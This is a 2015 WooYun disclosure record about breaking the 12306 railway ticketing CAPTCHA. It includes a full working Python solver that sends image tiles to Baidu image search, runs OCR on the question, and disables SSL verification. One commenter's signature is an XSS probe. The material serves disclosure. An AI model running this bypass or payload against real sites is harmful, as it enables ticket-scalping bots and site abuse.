{"id": 45608, "wybug_id": "wooyun-2015-0102178", "wybug_title": "12306 最新验证码可被破解（可继续被应用于抢票软件）", "wybug_corp": "12306", "wybug_author": "zph", "wybug_date": "2015-03-18 20:52", "wybug_open_date": "2015-03-18 22:08", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这个没人报上来吗……这种奇葩验证码记得早就能被某公共服务识别了……（验证代码来源于第三方） 详细说明：  利用Google 图片（http://images.google.com）写处代码（来自：https://github.com/andelf/fuck12306）\n#!/usr/bin/python# #  FileName    : fuck12306.py# #  Author      : MaoMao Wang <andelf@gmail.com># #  Created     : Mon Mar 16 22:08:41 2015 by ShuYu Wang# #  Copyright   : Feather (c) 2015# #  Description : fuck fuck 12306# #  Time-stamp: <2015-03-17 10:57:44 andelf>from PIL import Imagefrom PIL import ImageFilterimport urllibimport urllib2import reimport json# hack CERTIFICATE_VERIFY_FAILED# https://github.com/mtschirs/quizduellapi/issues/2import sslif hasattr(ssl, '_create_unverified_context'):    ssl._create_default_https_context = ssl._create_unverified_contextUA = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36\"pic_url = \"https://kyfw.12306.cn/otn/passcodeNew/getPassCodeNew?module=login&rand=sjrand&0.21191171556711197\"def get_img():    resp = urllib.urlopen(pic_url)    raw = resp.read()    with open(\"./tmp.jpg\", 'wb') as fp:        fp.write(raw)    return Image.open(\"./tmp.jpg\")def get_sub_img(im, x, y):    assert 0 <= x <= 3    assert 0 <= y <= 2    WITH = HEIGHT = 68    left = 5 + (67 + 5) * x    top = 41 + (67 + 5) * y    right = left + 67    bottom = top + 67    return im.crop((left, top, right, bottom))def baidu_stu_lookup(im):    url = \"http://stu.baidu.com/n/image?fr=html5&needRawImageUrl=true&id=WU_FILE_0&name=233.png&type=image%2Fpng&lastModifiedDate=Mon+Mar+16+2015+20%3A49%3A11+GMT%2B0800+(CST)&size=\"    im.save(\"./query_temp_img.png\")    raw = open(\"./query_temp_img.png\", 'rb').read()    url = url + str(len(raw))    req = urllib2.Request(url, raw, {'Content-Type':'image/png', 'User-Agent':UA})    resp = urllib2.urlopen(req)    resp_url = resp.read()      # return a pure url    url = \"http://stu.baidu.com/n/searchpc?queryImageUrl=\" + urllib.quote(resp_url)    req = urllib2.Request(url, headers={'User-Agent':UA})    resp = urllib2.urlopen(req)    html = resp.read()    return baidu_stu_html_extract(html)def baidu_stu_html_extract(html):    #pattern = re.compile(r'<script type=\"text/javascript\">(.*?)</script>', re.DOTALL | re.MULTILINE)    pattern = re.compile(r\"keywords:'(.*?)'\")    matches = pattern.findall(html)    if not matches:        return '[UNKNOWN]'    json_str = matches[0]    json_str = json_str.replace('\\\\x22', '\"').replace('\\\\\\\\', '\\\\')    #print json_str    result = [item['keyword'] for item in json.loads(json_str)]    return '|'.join(result) if result else '[UNKNOWN]'def ocr_question_extract(im):    # git@github.com:madmaze/pytesseract.git    global pytesseract    try:        import pytesseract    except:        print \"[ERROR] pytesseract not installed\"        return    im = im.crop((127, 3, 260, 22))    im = pre_ocr_processing(im)    # im.show()    return pytesseract.image_to_string(im, lang='chi_sim').strip()def pre_ocr_processing(im):    im = im.convert(\"RGB\")    width, height = im.size    white = im.filter(ImageFilter.BLUR).filter(ImageFilter.MaxFilter(23))    grey = im.convert('L')    impix = im.load()    whitepix = white.load()    greypix = grey.load()    for y in range(height):        for x in range(width):            greypix[x,y] = min(255, max(255 + impix[x,y][0] - whitepix[x,y][0],                                        255 + impix[x,y][1] - whitepix[x,y][1],                                        255 + impix[x,y][2] - whitepix[x,y][2]))    new_im = grey.copy()    binarize(new_im, 150)    return new_imdef binarize(im, thresh=120):    assert 0 < thresh < 255    assert im.mode == 'L'    w, h = im.size    for y in xrange(0, h):        for x in xrange(0, w):            if im.getpixel((x,y)) < thresh:                im.putpixel((x,y), 0)            else:                im.putpixel((x,y), 255)if __name__ == '__main__':    im = get_img()    #im = Image.open(\"./tmp.jpg\")    print 'OCR Question:', ocr_question_extract(im)    for y in range(2):        for x in range(4):            im2 = get_sub_img(im, x, y)            result = baidu_stu_lookup(im2)            print (y,x), result\n12306验证码即可被完爆   漏洞证明：  \n\n\n\n\n\n\n> 结果(0, 0) 苹果充电器(0, 1) 医师资格证|证件翻拍(0, 2) 手机|手机皮套(0, 3) 油炸薯条|炸暑条|双人(1, 0) 手机套|苹果手机套|手机配件(1, 1) 砂积石(1, 2) [UNKOWN](1, 3) 波导|可转穿衣镜|手机\n\n\n\n>(0, 0) 靴|保温杯(0, 1) 二粒小麦|刷子|成片种植(0, 2) 香辣酱|瓶装调料|果酱(0, 3) [UNKOWN](1, 0) 柚子|圆形果类(1, 1) 雪饼(1, 2) 李锦记|香辣酱|调料(1, 3) 素菜\n   修复方案：  1. 不要用这种奇葩验证码……这种验证码太太诡异，有时会挡住一些正常使用的用户。2. 既然抢票软件是全自动的，不如在图像验证码的前提下，加个二次验证？短信验证码？邮件确认？更多方案请自行发挥，呵呵呵呵呵呵呵……   版权声明：转载请注明来源 zph@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-03-18 22:08 厂商回复： 两个单选图片的答案，或者不是答案的相似图片多于答案图片。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-18 20:53 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  ....fuck12306    \n     2015-03-18 20:55 |    \t\t独孤求败 \t\t\t( 普通白帽子  |\t\t\t        Rank:1214 漏洞数:331        )\t\t \n  这个叼！    \n     2015-03-18 21:06 |    \t\tT0ne5 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 搬砖真的很累。)\t\t \n  还能不能让人安静的买个票啊！    \n     2015-03-18 21:07 |    \t\tQ1NG \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 临 兵 斗 者 皆 阵 列 前 行 !)\t\t \n  fuck12306  昨天就出来了    \n     2015-03-18 21:09 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:48        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  道高一尺魔高一丈    \n     2015-03-18 21:21 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  修复了还绕过    \n     2015-03-18 21:22 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @CloudSight    \n     2015-03-18 21:58 |    \t\tsdc1992 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:12        )\t\t \n  关注~    \n     2015-03-18 22:02 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  人家容易嘛，你们这帮人！！！    \n     2015-03-18 22:10 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  。。。。。。。。。。    \n     2015-03-18 22:18 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  厂商这态度。。醉了，一次错误就等于第二次也错误？怎么也不可能每次都错吧？既然不修复咱也没办法，那就等着继续被抢票软件轰炸吧，233    \n     2015-03-18 22:30 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  估计看到fuck所以忽略了    \n     2015-03-18 22:41 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  CCAV看这里！    \n     2015-03-18 23:30 |    \t\tKnight \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:10        | 刚刚上洗手间，看到一个玉树临风的少年，气...)\t\t \n  我去，不让人活了。还有安全的验证码吗？    \n     2015-03-18 23:54 |    \t\tADO \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:8        | Script)\t\t \n  正想着用py写一个呢 就被贴出来了    \n     2015-03-18 23:59 |    \t\t暧昧 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 此号乃是吾用来装孙子也)\t\t \n  闹腾    \n     2015-03-19 00:00 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  忽略得好快，破解大牛很快会出奇招    \n     2015-03-19 00:32 |    \t\t残雪 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:7        | 屌丝一枚擅长扯淡)\t\t \n  黄牛党万岁    \n     2015-03-19 00:48 |    \t\tCode_Monkey \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:7        | Code Monkey think someday he have everyt...)\t\t \n  洞主, 请问那个长得像樟脑球的雪饼能给12306吃么.    \n     2015-03-19 06:16 |    \t\tZtz \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:40        | 自由职业)\t\t \n  知乎上看到了。哈哈。我觉得这种验证码能让自己服务器瘫了。    \n     2015-03-19 08:45 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @12306 图片总数有限，可以被枚举的    \n     2015-03-19 08:56 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  @px1624 嗯，网上挺多相关文章的。算了~人家就没意识到漏洞的根本问题，就不想修复，有啥办法。我们作为白帽子只能做到发现漏洞问题和通报，但是厂商要没自觉性，那就没办法了~    \n     2015-03-19 09:57 |    \t\tn1Ce \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 面基品茶撸啊撸)\t\t \n  8张图片我也是看傻了，新亏百度还认得出来    \n     2015-03-19 10:10 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  一看你们就知道是黑客！    \n     2015-03-19 11:03 |    \t\tan0nym0us \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | no)\t\t \n  据说这个验证码是12306外包给别人做的    \n     2015-03-19 16:23 |    \t\t0x12 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | <script>alert(/0x12/)</script>)\t\t \n  呵呵哈哈哈    \n     2015-04-03 18:20 |    \t\tmapleeve \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 枫林晚矣)\t\t \n  呵呵呵，这样的验证码    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}